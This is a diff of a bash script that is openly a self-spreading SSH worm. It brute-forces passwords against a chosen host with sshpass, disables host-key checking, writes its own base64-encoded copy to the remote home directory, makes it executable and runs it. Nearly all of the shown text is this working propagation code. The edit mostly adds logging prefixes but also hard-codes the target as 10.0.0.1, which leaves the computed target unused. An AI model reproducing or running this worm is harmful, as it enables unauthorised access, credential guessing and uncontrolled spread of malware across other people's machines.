@@ -35,14 +35,21 @@ if [ $IP = $MY_IP ]; then
 	SEED=`expr $SEED % $NUM_HOSTS`
 	IP=${IPS[$SEED]}
 fi
-echo "The target IP is $IP"
+echo "[ $MY_IP] The target IP is $IP"
 
 
 # Brute force against the other hosts
 for PASS in "${PASSWORDS[@]}"
 do
-	echo "Trying user = $USER with password = $PASS"
-	sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP "echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; chmod +x \$HOME/$NEW_NAME ; sleep 10s ; ./$NEW_NAME" # 2> /dev/null
+	echo "[ $MY_IP] Trying user = $USER with password = $PASS"
+
+	# Execute the worm on the remote host using sshpass
+	sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@10.0.0.1 \
+		"echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; \
+		chmod +x \$HOME/$NEW_NAME ; \
+		sleep 10s ; \
+		./$NEW_NAME" # 2> /dev/null
+
 	if [ $? -eq 0 ]; then
 	    echo "OK"
 	else
